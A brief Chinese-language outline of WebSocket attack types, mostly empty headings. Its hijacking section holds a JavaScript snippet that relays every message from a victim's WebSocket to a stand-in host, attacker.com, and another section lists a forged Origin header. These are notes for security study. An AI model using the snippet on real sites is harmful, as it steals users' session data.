# WebSocket安全

## 1. WebSocket劫持

```javascript
var ws = new WebSocket("wss://target.com/ws");
ws.onmessage = function(evt) {
  fetch('http://attacker.com/log?data='+evt.data);
}
```

## 2. WebSocket走私

```
HTTP Upgrade请求走私
```

## 3. 认证绕过

### Token泄露

### 认证绕过

## 4. 跨站点WebSocket

```
Origin: attacker.com
```

## 5. 消息注入

```
WebSocket消息注入
```

## 6. 敏感信息泄露
